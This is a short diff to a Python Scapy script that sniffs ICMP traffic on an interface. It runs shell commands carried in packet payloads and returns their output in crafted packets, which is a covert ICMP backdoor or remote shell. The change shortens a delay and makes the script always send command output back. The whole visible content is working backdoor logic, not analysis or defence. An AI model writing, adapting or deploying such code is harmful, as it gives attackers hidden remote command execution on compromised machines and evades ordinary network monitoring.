@@ -42,7 +42,7 @@ def action(pkt):
 			elif buff[4:8] == port:
 				print "Port"
 			elif buff[4:8] == shell:
-				time.sleep(0.5)
+				time.sleep(0.1)
 				command_shell(buff[8:])
 
 def packet_builder(data):
@@ -59,7 +59,6 @@ def command_shell(data):
 	proc = subprocess.Popen(data, shell=True, stdout=subprocess.PIPE, 
 	stderr=subprocess.PIPE, stdin=subprocess.PIPE)
 	value = proc.stdout.read() + proc.stderr.read()
-	if len(value) > 1:
-		sendp(packet_builder(shell + value + prompt),verbose=0)
+	sendp(packet_builder(shell + value + prompt),verbose=0)
 
 sniff(iface=sys.argv[1],filter="icmp",prn=action)
